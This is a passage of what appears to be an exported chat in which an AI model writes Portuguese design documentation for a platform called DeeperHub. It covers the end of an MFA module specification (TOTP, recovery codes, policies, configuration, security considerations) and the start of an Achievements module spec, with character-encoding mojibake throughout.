    *   Verificar c√≥digos de recupera√ß√£o (`verify_recovery_code/2`).
    *   Processar respostas de notifica√ß√µes push (`PushVerificationService.process_verification_response/3`).
    *   Verificar c√≥digos OTP enviados por email/SMS (se implementado).
*   **Gera√ß√£o de C√≥digos e Desafios:**
    *   Gerar segredos TOTP e URIs de configura√ß√£o.
    *   Gerar desafios para WebAuthn (delegado para `DeeperHub.WebAuthn`).
    *   Gerar um conjunto de c√≥digos de recupera√ß√£o √∫nicos (`generate_recovery_codes/2`).
    *   Gerar e enviar c√≥digos OTP para email/SMS (`send_code/4`).
*   **Gerenciamento de Prefer√™ncias MFA do Usu√°rio:**
    *   Permitir que usu√°rios definam um m√©todo MFA preferencial.
    *   Armazenar e consultar prefer√™ncias (`get_user_preferences/1`, `update_user_preferences/2`).
*   **Pol√≠ticas de MFA (`Services.MFAPolicyService`):**
    *   Determinar quando o MFA √© obrigat√≥rio para um usu√°rio ou opera√ß√£o (`requires_mfa?/2`).
    *   Gerenciar per√≠odos de car√™ncia para configura√ß√£o de MFA.
    *   Rastrear se uma sess√£o atual j√° passou por uma verifica√ß√£o MFA recente (`has_recent_verification?/2`).
*   **Prote√ß√£o contra For√ßa Bruta em Verifica√ß√µes MFA:**
    *   Limitar o n√∫mero de tentativas falhas de verifica√ß√£o de c√≥digo.
*   **Observabilidade e Auditoria:**
    *   Registrar logs e m√©tricas para todas as opera√ß√µes MFA.
    *   Auditar a configura√ß√£o, remo√ß√£o e uso de m√©todos MFA.
*   **Integra√ß√£o com o Fluxo de Login (`DeeperHub.Auth`):**
    *   Ser chamado pelo `AuthService` quando MFA √© necess√°rio ap√≥s a autentica√ß√£o prim√°ria.
*   **Interface para \"Step-up Authentication\":**
    *   Permitir que opera√ß√µes de alto risco exijam uma nova verifica√ß√£o MFA, mesmo que o usu√°rio j√° esteja logado.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.MFA` (Fachada P√∫blica, ex-`MFAFacade`):**
    *   Ponto de entrada para todas as funcionalidades MFA.
    *   Delega para o `MFAService` ou diretamente para servi√ßos de m√©todos espec√≠ficos.
2.  **`DeeperHub.MFA.Services.MFAService` (ou `DefaultMFAService` - GenServer/Coordenador):**
    *   **Responsabilidade:** Orquestra as opera√ß√µes MFA.
    *   **Intera√ß√µes:**
        *   `TOTPService`, `RecoveryCodeService`, `PushVerificationService`.
        *   `DeeperHub.WebAuthn` (para opera√ß√µes WebAuthn).
        *   `MFAPolicyService`: Para verificar se MFA √© mandat√≥rio.
        *   `DeeperHub.Core.Repo` (via schemas): Para persistir configura√ß√µes MFA do usu√°rio.
        *   `DeeperHub.Notifications`: Para enviar c√≥digos OTP ou notifica√ß√µes sobre MFA.
        *   `DeeperHub.Core.ConfigManager`: Para configura√ß√µes.
        *   `DeeperHub.Security.BruteForceProtection`: Para limitar tentativas de verifica√ß√£o.
3.  **Servi√ßos por M√©todo MFA:**
    *   **`DeeperHub.MFA.Services.TOTPService`:** L√≥gica para setup e verifica√ß√£o de TOTP. Usa `DeeperHub.MFA.TOTP` schema.
    *   **`DeeperHub.MFA.Services.RecoveryCodeService`:** L√≥gica para gera√ß√£o, armazenamento (hashes) e verifica√ß√£o de c√≥digos de recupera√ß√£o. Usa `DeeperHub.MFA.RecoveryCode` schema.
    *   **`DeeperHub.MFA.Services.PushVerificationService`:** L√≥gica para gerenciar registro de dispositivos push e o fluxo de verifica√ß√£o via push. Usa `DeeperHub.MFA.Schema.PushDevice`.
    *   *(`WebAuthnService` est√° em `DeeperHub.WebAuthn` mas √© usado como um m√©todo MFA)*.
4.  **`DeeperHub.MFA.Services.MFAPolicyService`:**
    *   Determina se MFA √© necess√°rio para um usu√°rio/opera√ß√£o e gerencia o estado de verifica√ß√£o MFA recente na sess√£o.
5.  **Schemas Ecto:**
    *   `DeeperHub.MFA.TOTP`: Armazena segredo TOTP (criptografado), status.
    *   `DeeperHub.MFA.RecoveryCode`: Armazena hashes dos c√≥digos de recupera√ß√£o e seu status de uso.
    *   `DeeperHub.MFA.Schema.PushDevice`: Armazena tokens de dispositivos para notifica√ß√µes push.
    *   `DeeperHub.MFA.Schema.UserMFAPreferences` (Novo Sugerido): Armazena o m√©todo preferido do usu√°rio, se o MFA est√° habilitado por ele, etc.
6.  **Integra√ß√µes (`AuditIntegration`, `EventIntegration`, `MFAAnomalyIntegration`, `MFANotificationIntegration`):**
    *   Para auditoria, eventos de dom√≠nio, an√°lise de anomalias e notifica√ß√µes espec√≠ficas de MFA.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/mfa/
‚îú‚îÄ‚îÄ mfa.ex                              # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îú‚îÄ‚îÄ mfa_service.ex                  # Servi√ßo orquestrador principal
‚îÇ   ‚îú‚îÄ‚îÄ totp_service.ex
‚îÇ   ‚îú‚îÄ‚îÄ recovery_code_service.ex
‚îÇ   ‚îú‚îÄ‚îÄ push_verification_service.ex
‚îÇ   ‚îî‚îÄ‚îÄ mfa_policy_service.ex
‚îÇ
‚îú‚îÄ‚îÄ schemas/                            # (Ou schema/ singular)
‚îÇ   ‚îú‚îÄ‚îÄ totp.ex
‚îÇ   ‚îú‚îÄ‚îÄ recovery_code.ex
‚îÇ   ‚îú‚îÄ‚îÄ push_device.ex
‚îÇ   ‚îî‚îÄ‚îÄ user_mfa_preferences.ex       # Novo
‚îÇ
‚îú‚îÄ‚îÄ integrations/
‚îÇ   ‚îú‚îÄ‚îÄ audit_integration.ex
‚îÇ   ‚îú‚îÄ‚îÄ event_integration.ex
‚îÇ   ‚îú‚îÄ‚îÄ mfa_anomaly_integration.ex
‚îÇ   ‚îî‚îÄ‚îÄ mfa_notification_integration.ex
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex
```
*(O `DeeperHub.WebAuthn` seria um m√≥dulo irm√£o, mas conceitualmente um m√©todo MFA)*

### 3.3. Decis√µes de Design Importantes

*   **Seguran√ßa dos Segredos MFA:** Segredos TOTP e outros dados sens√≠veis de MFA devem ser criptografados em repouso (`Core.EncryptionService`).
*   **Experi√™ncia do Usu√°rio:** O fluxo de configura√ß√£o e uso de MFA deve ser o mais simples e intuitivo poss√≠vel.
*   **C√≥digos de Recupera√ß√£o:** Sempre fornecer c√≥digos de recupera√ß√£o ao habilitar MFA, pois s√£o cruciais se o usu√°rio perder acesso ao seu dispositivo MFA principal.
*   **M√∫ltiplos M√©todos:** Permitir que os usu√°rios configurem m√∫ltiplos m√©todos MFA aumenta a resili√™ncia.
*   **Rate Limiting em Verifica√ß√µes:** Proteger contra a adivinha√ß√£o de c√≥digos TOTP ou OTPs.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Usu√°rio Habilita TOTP:**
    *   Usu√°rio navega para configura√ß√µes de seguran√ßa e escolhe adicionar TOTP.
    *   `MFA.setup_method(user_id, :totp)` √© chamado.
    *   `TOTPService` gera um segredo, cria um QR code URI.
    *   Usu√°rio escaneia com seu app autenticador e insere o primeiro c√≥digo para confirmar.
    *   `MFA.verify_code(user_id, totp_code, %{method: :totp, context: :setup_confirmation})` √© chamado.
    *   Se v√°lido, TOTP √© marcado como ativo para o usu√°rio. C√≥digos de recupera√ß√£o s√£o gerados e exibidos.
*   **Login com MFA:**
    *   `DeeperHub.Auth` determina que MFA √© necess√°rio ap√≥s a senha.
    *   Frontend solicita ao usu√°rio seu m√©todo MFA preferido ou o pr√≥ximo fator.
    *   Usu√°rio insere c√≥digo TOTP.
    *   Frontend envia para `DeeperHub.Auth.verify_second_factor(user_id, :totp, code, context)`.
    *   `Auth` delega para `MFA.verify_code(user_id, code, %{method: :totp, context: :login})`.
    *   Se v√°lido, login prossegue; sen√£o, erro.
*   **Usu√°rio Perde Dispositivo TOTP e Usa C√≥digo de Recupera√ß√£o:**
    *   No fluxo de login, ap√≥s a senha, usu√°rio escolhe \"Usar c√≥digo de recupera√ß√£o\".
    *   Insere um de seus c√≥digos.
    *   `MFA.verify_recovery_code(user_id, recovery_code)` √© chamado.
    *   Se v√°lido, o c√≥digo √© marcado como usado, e o login prossegue. O sistema deve incentivar o usu√°rio a configurar um novo m√©todo MFA e gerar novos c√≥digos de recupera√ß√£o.

## üåä 5. Fluxos Importantes

### Fluxo de Configura√ß√£o de Novo M√©todo MFA (Ex: TOTP)

1.  **Usu√°rio (UI):** Inicia o processo de adicionar TOTP.
2.  **Frontend -> Backend API Controller:** Chama um endpoint que leva a `DeeperHub.MFA.setup_method(user_id, :totp, %{issuer_name: \"DeeperHub\"})`.
3.  **`MFAService` (ou `TOTPService` diretamente):**
    *   Gera um novo segredo TOTP (ex: 160 bits de aleatoriedade).
    *   Cria uma URI `otpauth://` contendo o segredo, nome do emissor, e email/username do usu√°rio.
    *   Armazena temporariamente o segredo (ou um hash dele) associado ao `user_id` e um status \"pendente de verifica√ß√£o\".
    *   Retorna a URI (para QR code) e o segredo em formato texto (para entrada manual) para o frontend.
4.  **Frontend:** Exibe o QR code e o campo para o usu√°rio inserir o primeiro c√≥digo TOTP gerado pelo seu app autenticador.
5.  **Usu√°rio (UI):** Escaneia o QR code, v√™ o c√≥digo no app, e o insere na UI.
6.  **Frontend -> Backend API Controller:** Chama um endpoint que leva a `DeeperHub.MFA.verify_code(user_id, submitted_totp_code, %{method: :totp, context: :setup_confirmation})`.
7.  **`MFAService` (ou `TOTPService`):**
    *   Recupera o segredo TOTP pendente para o `user_id`.
    *   Valida o `submitted_totp_code` contra o segredo (considerando janelas de tempo).
    *   **Se V√°lido:**
        *   Marca o m√©todo TOTP como ativo para o usu√°rio (persiste o segredo criptografado).
        *   Chama `RecoveryCodeService.generate_and_store(user_id, default_count)` para gerar c√≥digos de recupera√ß√£o.
        *   Retorna `{:ok, %{recovery_codes: [...]}}` (ou apenas `:ok` e o frontend busca os c√≥digos depois).
        *   Publica evento `mfa_method_added`. Audita.
    *   **Se Inv√°lido:** Retorna erro, incrementa contador de falhas (para brute force).

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.MFA`)

*(Baseado na documenta√ß√£o original de `MFAFacade` e servi√ßos relacionados)*

### 6.1. `DeeperHub.MFA.setup_method(user_id :: String.t(), method :: :totp | :webauthn | :push | :sms_otp, details :: map() | nil) :: {:ok, SetupData.t()} | {:error, term()}`

*   **Descri√ß√£o:** Inicia o processo de configura√ß√£o para um novo m√©todo MFA.
*   **`details`:** Espec√≠fico do m√©todo (ex: para `:totp`, `%{issuer_name: \"MyApp\"}`; para `:push`, `%{device_name: \"My iPhone\"}`).
*   **`SetupData.t()`:** Varia por m√©todo.
    *   Para `:totp`: `%{secret_key: String.t(), otpauth_uri: String.t()}`.
    *   Para `:webauthn`: Op√ß√µes de registro do `DeeperHub.WebAuthn.start_registration`.
    *   Para `:push`: Confirma√ß√£o do registro do dispositivo.

### 6.2. `DeeperHub.MFA.verify_code(user_id :: String.t(), code :: String.t(), verification_context :: map()) :: {:ok, :verified} | {:error, :invalid_code | :max_attempts_reached | term()}`

*   **Descri√ß√£o:** Verifica um c√≥digo MFA (TOTP, SMS OTP, ou um token de contexto de uma verifica√ß√£o push/webauthn j√° iniciada).
*   **`verification_context`:** `%{method: :totp | :sms_otp, operation: :login | :setup_confirmation | :critical_action, ...}`.

### 6.3. `DeeperHub.MFA.generate_recovery_codes(user_id :: String.t(), opts :: keyword()) :: {:ok, list(String.t())} | {:error, term()}`

*   **Descri√ß√£o:** Gera um novo conjunto de c√≥digos de recupera√ß√£o, invalidando os antigos.
*   **`opts`:** `:count` (integer, Padr√£o: `10`).

### 6.4. `DeeperHub.MFA.verify_recovery_code(user_id :: String.t(), recovery_code :: String.t()) :: {:ok, :verified} | {:error, :invalid_code | :code_already_used | term()}`

*   **Descri√ß√£o:** Verifica um c√≥digo de recupera√ß√£o. Se v√°lido, marca-o como usado.

### 6.5. `DeeperHub.MFA.list_user_methods(user_id :: String.t()) :: {:ok, list(MethodInfo.t())}`

*   **Descri√ß√£o:** Lista os m√©todos MFA configurados e ativos para um usu√°rio.
*   **`MethodInfo.t()`:** `%{method_type: :totp | :webauthn | :push | :recovery_codes_active, id: String.t() | nil, name: String.t() | nil, added_at: DateTime.t()}`.

### 6.6. `DeeperHub.MFA.remove_method(user_id :: String.t(), method_type :: atom(), method_id :: String.t() | nil, verification_code_or_password :: String.t()) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Remove um m√©todo MFA configurado. Requer verifica√ß√£o (senha ou outro fator MFA) para seguran√ßa.
*   **`method_id`:** Necess√°rio para WebAuthn (ID da credencial) ou Push (ID do dispositivo).

### 6.7. `DeeperHub.MFA.get_user_mfa_preferences(user_id :: String.t()) :: {:ok, UserMFAPreferences.t()}`

*   **Descri√ß√£o:** Obt√©m as prefer√™ncias MFA do usu√°rio (ex: m√©todo preferido, se MFA est√° habilitado por ele).

### 6.8. `DeeperHub.MFA.update_user_mfa_preferences(user_id :: String.t(), preferences :: map()) :: {:ok, UserMFAPreferences.t()} | {:error, Ecto.Changeset.t()}`

*   **Descri√ß√£o:** Atualiza as prefer√™ncias MFA do usu√°rio.

### 6.9. `DeeperHub.MFA.Services.MFAPolicyService` (Fun√ß√µes expostas via `MFA` ou chamadas internamente por `Auth`):

*   `requires_mfa?(user_id, operation_context)`
*   `has_recent_mfa_verification?(user_id, session_id, operation_context)`
*   `register_mfa_verification_in_session(session_id, user_id, method_used)`

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:mfa, :enabled]`** (Boolean): Habilita/desabilita o sistema MFA globalmente. (Padr√£o: `true`)
*   **`[:mfa, :allowed_methods]`** (List de Atoms): M√©todos MFA suportados e permitidos no sistema (ex: `[:totp, :webauthn, :recovery_code, :push]`).
*   **`[:mfa, :policy, :require_mfa_for_roles]`** (List de Strings): Pap√©is de usu√°rio que sempre exigem MFA. (Ex: `[\"admin\", \"moderator\"]`).
*   **`[:mfa, :policy, :grace_period_days_for_new_users]`** (Integer | nil): Per√≠odo para novos usu√°rios configurarem MFA.
*   **`[:mfa, :policy, :session_mfa_validity_seconds]`** (Integer): Por quanto tempo uma verifica√ß√£o MFA na sess√£o √© considerada v√°lida para pular verifica√ß√µes subsequentes (step-up).
*   **`[:mfa, :totp, :issuer_name]`** (String): Nome do emissor exibido em apps autenticadores. (Padr√£o: \"DeeperHub\")
*   **`[:mfa, :totp, :secret_length_bytes]`** (Integer): Comprimento do segredo TOTP.
*   **`[:mfa, :totp, :verification_window]`** (Integer): Quantos c√≥digos passados/futuros s√£o v√°lidos. (Padr√£o: `1` - ou seja, atual, anterior e pr√≥ximo).
*   **`[:mfa, :recovery_code, :default_count]`** (Integer): N√∫mero de c√≥digos de recupera√ß√£o gerados. (Padr√£o: `10`)
*   **`[:mfa, :recovery_code, :hash_algorithm]`** (Atom): Algoritmo para hashear c√≥digos de recupera√ß√£o.
*   **`[:mfa, :push_verification, :default_timeout_seconds]`** (Integer).
*   **`[:mfa, :brute_force, :max_verify_attempts]`** (Integer): Tentativas de verifica√ß√£o de c√≥digo antes de bloqueio/delay.
*   **`[:mfa, :brute_force, :lockout_duration_seconds]`** (Integer).

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.*`: Todos os m√≥dulos Core.
*   `DeeperHub.Auth`: Para integrar no fluxo de login e obter informa√ß√µes do usu√°rio.
*   `DeeperHub.Accounts`: Para dados do usu√°rio.
*   `DeeperHub.WebAuthn`: Para a funcionalidade WebAuthn.
*   `DeeperHub.Notifications`: Para enviar c√≥digos OTP por email/SMS e notifica√ß√µes sobre MFA.
*   `DeeperHub.Security.BruteForceProtection`: Para proteger contra adivinha√ß√£o de c√≥digos.
*   `DeeperHub.Core.EncryptionService`: Para criptografar segredos TOTP.

### 8.2. Bibliotecas Externas

*   `ex_totp` (ou similar): Para l√≥gica TOTP.
*   Bibliotecas para WebAuthn (se n√£o usar a interna `DeeperHub.WebAuthn`).
*   Bibliotecas cliente para servi√ßos de SMS/Push (se esses canais forem implementados).

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Fluxo de Login (`DeeperHub.Auth`):**
    *   Ap√≥s a senha ser verificada, `AuthService` chama `MFAPolicyService.requires_mfa?`.
    *   Se `true`, `AuthService` retorna `{:error, :mfa_required, ...}`.
    *   O frontend guia o usu√°rio pelo fluxo MFA, chamando os endpoints da API MFA (que usam `DeeperHub.MFA` fachada).
*   **Configura√ß√µes de Seguran√ßa do Usu√°rio (UI):**
    *   Permitir que o usu√°rio liste, adicione e remova m√©todos MFA usando os endpoints da API MFA.
*   **Step-up Authentication:**
    *   Antes de uma opera√ß√£o cr√≠tica, um servi√ßo pode chamar `MFAPolicyService.requires_mfa?(user_id, %{operation: :delete_account, session_mfa_verified: session.mfa_verified_at})`.
    *   Se `true`, redirecionar para verifica√ß√£o MFA.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o fluxo de setup e verifica√ß√£o para cada m√©todo MFA suportado (TOTP, Recovery Code, WebAuthn, Push).
*   Testar a l√≥gica de `MFAPolicyService` (quando MFA √© obrigat√≥rio, validade da sess√£o MFA).
*   Testar a gera√ß√£o e invalida√ß√£o de c√≥digos de recupera√ß√£o.
*   Testar a remo√ß√£o de m√©todos e o impacto no status MFA do usu√°rio.
*   Testar a prote√ß√£o contra for√ßa bruta nas verifica√ß√µes de c√≥digo.
*   Localiza√ß√£o: `test/deeper_hub/mfa/`.

### 10.2. M√©tricas

*   `deeper_hub.mfa.setup_attempt.count` (tags: `method`, `status` (`success`, `failure`))
*   `deeper_hub.mfa.verification_attempt.count` (tags: `method`, `context` (`login`, `step_up`), `status` (`success`, `failure`))
*   `deeper_hub.mfa.users_with_mfa_enabled.gauge` (Gauge, tags: `method_count` (`one_method`, `multi_method`))
*   `deeper_hub.mfa.recovery_codes_used.count`
*   `deeper_hub.mfa.method_removed.count` (tags: `method`)

### 10.3. Logs

*   **N√≠vel INFO:** M√©todo MFA configurado/removido. Verifica√ß√£o MFA bem-sucedida.
*   **N√≠vel WARNING:** Tentativa de verifica√ß√£o MFA falhou. Usu√°rio usou c√≥digo de recupera√ß√£o.
*   **N√≠vel ERROR:** Falha cr√≠tica no setup de MFA. Erro ao enviar c√≥digo OTP.

### 10.4. Telemetria

*   `[:deeper_hub, :mfa, :setup, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, method: method}`
*   `[:deeper_hub, :mfa, :verify, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, method: method, context: context, result: :success | :failure}`
*   `[:deeper_hub, :mfa, :policy_check]`
    *   Metadados: `%{user_id: id, operation: op, result_requires_mfa: boolean}`

## ‚ùå 11. Tratamento de Erros

*   Falhas na verifica√ß√£o de c√≥digo devem retornar erros claros (c√≥digo inv√°lido, expirado, m√°ximo de tentativas).
*   Problemas com servi√ßos externos (ex: envio de SMS) devem ser tratados com retentativas e fallbacks (ex: sugerir outro m√©todo MFA).
*   Se o usu√°rio perder todos os seus m√©todos MFA e c√≥digos de recupera√ß√£o, um processo de recupera√ß√£o de conta manual e seguro (via suporte) deve existir.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Seguran√ßa dos Segredos TOTP:** Devem ser criptografados em repouso.
*   **Seguran√ßa dos C√≥digos de Recupera√ß√£o:** Devem ser exibidos apenas uma vez para o usu√°rio e armazenados como hashes.
*   **Prote√ß√£o contra Replay:** C√≥digos OTP e desafios WebAuthn devem ser de uso √∫nico.
*   **Rate Limiting:** Essencial para todas as opera√ß√µes de verifica√ß√£o de c√≥digo.
*   **N√£o Confiar no Cliente:** Todas as valida√ß√µes devem ocorrer no servidor.
*   **Pol√≠ticas de MFA Fortes:** Encorajar ou obrigar o uso de MFA para todos os usu√°rios, especialmente administradores.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao adicionar um novo m√©todo MFA, criar um novo servi√ßo em `services/` e integr√°-lo com `MFAService`.
*   Garantir que todos os fluxos de configura√ß√£o e verifica√ß√£o sejam testados exaustivamente.
*   Considerar a usabilidade dos fluxos MFA.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Adicionar suporte para mais m√©todos MFA (ex: Chaves de Seguran√ßa baseadas em Hardware diferentes de WebAuthn padr√£o, como YubiKey OTP).
*   [ ] Permitir que usu√°rios definam \"dispositivos confi√°veis\" onde o MFA pode ser pulado por um per√≠odo. (Isso interage com `DeviceService` e `MFAPolicyService`).
*   [ ] Implementar MFA adaptativo, onde a necessidade de MFA √© determinada dinamicamente pelo `RiskAssessment`.
*   [ ] Interface administrativa para ajudar usu√°rios bloqueados de seus m√©todos MFA (com verifica√ß√£o de identidade rigorosa).
*   [ ] Melhorar as op√ß√µes de notifica√ß√£o push para serem mais interativas (ex: bot√µes \"Aprovar\"/\"Negar\" diretamente na notifica√ß√£o).

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

MFA √© um grande passo para a seguran√ßa de contas!

Onde vamos a seguir? J√° cobrimos muitos m√≥dulos Core e de Seguran√ßa. Podemos continuar com os m√≥dulos de seguran√ßa restantes (`HashingService`, `AtRestEncryptionService` se quisermos detalh√°-los mais do que no `Core.EncryptionService`, `ResponseSanitizer`), ou come√ßar a explorar os m√≥dulos de dom√≠nio que foram originalmente listados em `Services` (como `ServerPackages`, `ServerEvents`, `Achievements`, etc.)?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
                types.Part.from_text(text="""continue
"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Dado que j√° cobrimos uma gama bem ampla dos m√≥dulos de seguran√ßa e infraestrutura Core, e que os m√≥dulos de \"Servi√ßos\" da documenta√ß√£o original (`Achievements`, `Challenges`, `Lists`, `Rewards`, `ServerAdvertisements`, `ServerAlerts`, `ServerEvents`, `ServerPackages`, `ServerReviews`, `ServerTags`, `ServerUpdateMessages`, `Support`, `UserInteractions`) representam os **dom√≠nios de neg√≥cio espec√≠ficos** da plataforma DeeperHub, vamos abordar a estrutura e a abordagem para document√°-los, e ent√£o detalhar um deles como exemplo.

**Abordagem Geral para M√≥dulos de Dom√≠nio (Ex-\"Services\"):**

A ideia principal da refatora√ß√£o de namespaces sugerida anteriormente era elevar cada um desses \"Servi√ßos\" a um contexto de dom√≠nio de primeiro n√≠vel dentro do DeeperHub. Por exemplo:

*   `DeeperHub.Services.Achievements` se tornaria `DeeperHub.Achievements`
*   `DeeperHub.Services.ServerReviews` se tornaria `DeeperHub.ServerReviews` (como j√° fizemos)
*   `DeeperHub.Services.Support` se tornaria `DeeperHub.Support`

Cada um desses m√≥dulos de dom√≠nio seguiria uma estrutura interna similar, contendo:

1.  **Fachada P√∫blica (ex: `DeeperHub.Achievements.AchievementsFacade` ou apenas `DeeperHub.Achievements`):** O ponto de entrada para o dom√≠nio.
2.  **Servi√ßo(s) de Dom√≠nio (ex: `DeeperHub.Achievements.Services.AchievementsService`):** Cont√©m a l√≥gica de neg√≥cio principal.
3.  **Schemas Ecto (ex: `DeeperHub.Achievements.Schemas.AchievementSchema`, `UserAchievementSchema`):** Define as entidades do dom√≠nio.
4.  **Storage/Reposit√≥rio (ex: `DeeperHub.Achievements.Storage`):** M√≥dulo que encapsula as queries Ecto, chamando `DeeperHub.Core.Repo`.
5.  **Integra√ß√µes (Opcional, ex: `DeeperHub.Achievements.Integrations.EventIntegration`):** Para interagir com `Core.EventBus` ou outros sistemas.
6.  **Workers (Opcional):** Para tarefas de background espec√≠ficas do dom√≠nio.
7.  **Supervisor:** Para os GenServers do dom√≠nio.
8.  **Telemetry/Metrics:** Para observabilidade espec√≠fica do dom√≠nio.
9.  **CachedAdapter (Opcional):** Se o dom√≠nio se beneficia de uma camada de cache espec√≠fica e granular, al√©m do `Core.Cache` gen√©rico.

Vamos escolher um para detalhar, talvez `DeeperHub.Achievements` como um bom exemplo de um m√≥dulo de dom√≠nio.

---

# M√≥dulo: `DeeperHub.Achievements` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Achievements`

O m√≥dulo `DeeperHub.Achievements` √© respons√°vel por gerenciar o **sistema de conquistas (achievements)** dentro da plataforma DeeperHub. Ele permite a defini√ß√£o de v√°rias conquistas que os usu√°rios podem desbloquear ao realizar certas a√ß√µes, atingir marcos ou participar de atividades espec√≠ficas no sistema.

Este m√≥dulo lida com:
*   A defini√ß√£o e o gerenciamento das pr√≥prias conquistas (nome, descri√ß√£o, crit√©rios, √≠cone, pontos, etc.).
*   O rastreamento do progresso dos usu√°rios em rela√ß√£o √†s conquistas.
*   A concess√£o de conquistas aos usu√°rios quando os crit√©rios s√£o atendidos.
*   A consulta de conquistas desbloqueadas por um usu√°rio e a listagem de todas as conquistas dispon√≠veis.

O objetivo √© engajar os usu√°rios, recompensar a participa√ß√£o e fornecer um senso de progress√£o e reconhecimento dentro da plataforma. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento de Defini√ß√µes de Conquistas (`create_achievement_definition/1`, `update_achievement_definition/2`, etc.):**
    *   Permitir que administradores criem, visualizem, atualizem e excluam as defini√ß√µes das conquistas dispon√≠veis no sistema.
    *   Cada defini√ß√£o inclui: nome, descri√ß√£o, √≠cone, crit√©rios para desbloqueio (podem ser complexos e baseados em eventos), pontos de recompensa (se houver), tipo de conquista (ex: marco, evento, explora√ß√£o), raridade.
*   **Rastreamento de Progresso do Usu√°rio:**
    *   Receber eventos do sistema (via `Core.EventBus` ou chamadas diretas) que indicam progresso do usu√°rio em rela√ß√£o a uma conquista.
    *   Manter o estado do progresso para conquistas que exigem m√∫ltiplas etapas ou contadores.
*   **Concess√£o de Conquistas (`unlock_achievement_for_user/3`):**
    *   Verificar automaticamente se um usu√°rio atendeu aos crit√©rios para desbloquear uma conquista ap√≥s um evento relevante.
    *   Registrar que um usu√°rio desbloqueou uma conquista espec√≠fica, incluindo a data.
    *   Garantir que uma conquista s√≥ possa ser desbloqueada uma vez por usu√°rio (a menos que seja repet√≠vel).
*   **Consulta de Conquistas:**
    *   Listar todas as conquistas dispon√≠veis no sistema, com filtros (ex: por tipo, por jogo/servi√ßo associado, se aplic√°vel) (`list_achievement_definitions/1`).
    *   Listar todas as conquistas desbloqueadas por um usu√°rio espec√≠fico (`list_user_unlocked_achievements/1`).
    *   Verificar o status de uma conquista espec√≠fica para um usu√°rio (bloqueada, em progresso, desbloqueada) (`get_user_achievement_status/2`).
*   **Notifica√ß√µes (Integra√ß√£o):**
    *   Notificar usu√°rios quando eles desbloqueiam uma nova conquista (via `DeeperHub.Notifications`).
*   **Observabilidade e Auditoria:**
    *   Registrar logs e m√©tricas sobre defini√ß√µes de conquistas e desbloqueios.
    *   Publicar eventos de dom√≠nio (ex: `achievement.unlocked`) no `Core.EventBus`.
    *   Auditar a cria√ß√£o/modifica√ß√£o de defini√ß√µes de conquistas por administradores.
*   **Caching:**
    *   Cachear defini√ß√µes de conquistas e, potencialmente, listas de conquistas desbloqueadas por usu√°rios ativos para performance.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Achievements` (Fachada P√∫blica):**
    *   Ponto de entrada para todas as opera√ß√µes relacionadas a conquistas.
    *   Delega para o `AchievementsService`.
2.  **`DeeperHub.Achievements.Services.AchievementsService` (ou `DefaultAchievementsService`):**
    *   **Responsabilidade:** Orquestra a l√≥gica de neg√≥cio principal para o sistema de conquistas.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `AchievementDefinitionSchema` e `UserAchievementSchema`.
        *   `DeeperHub.Core.EventBus`: Para escutar eventos do sistema que podem acionar progresso ou desbloqueio de conquistas, e para publicar eventos de `achievement.unlocked`.
        *   `DeeperHub.Core.Cache`: Para cachear defini√ß√µes e conquistas de usu√°rios.
        *   `DeeperHub.Core.ConfigManager`: Para configura√ß√µes (ex: se o sistema de conquistas est√° habilitado globalmente).
        *   `DeeperHub.Notifications`: Para notificar usu√°rios sobre desbloqueios.
        *   `DeeperHub.Audit`: Para auditar gerenciamento de defini√ß√µes.
3.  **Schemas Ecto:**
    *   **`DeeperHub.Achievements.Schemas.AchievementDefinitionSchema`:** Armazena os detalhes de cada conquista (nome, descri√ß√£o, crit√©rios como JSON ou DSL, √≠cone, pontos, tipo, etc.).
    *   **`DeeperHub.Achievements.Schemas.UserAchievementSchema`:** Tabela de jun√ß√£o que registra qual usu√°rio (`user_id`) desbloqueou qual conquista (`achievement_definition_id`) e quando (`unlocked_at`). Pode tamb√©m armazenar progresso para conquistas com m√∫ltiplas etapas.
4.  **`DeeperHub.Achievements.Storage` (ou l√≥gica dentro do `AchievementsService`):**
    *   Encapsula as queries Ecto.
5.  **`DeeperHub.Achievements.CriterionEvaluator` (M√≥dulo Funcional ou Servi√ßo):**
    *   **Responsabilidade:** Avaliar se os crit√©rios de uma `AchievementDefinition` foram atendidos por um usu√°rio com base em seus dados, progresso ou eventos recebidos. A l√≥gica dos crit√©rios pode ser complexa (ex: \"fazer login 7 dias seguidos\", \"derrotar 100 inimigos do tipo X\", \"visitar todas as 5 regi√µes do mapa\").
6.  **`DeeperHub.Achievements.EventListener` (GenServer ou m√≥dulo que implementa callback do EventBus):**
    *   **Responsabilidade:** Escutar eventos relevantes do `Core.EventBus` (ex: `user.action_performed`, `server.review_posted`, `game.level_completed`) e chamar o `CriterionEvaluator` para verificar se alguma conquista foi desbloqueada.
7.  **Workers (Opcional):**
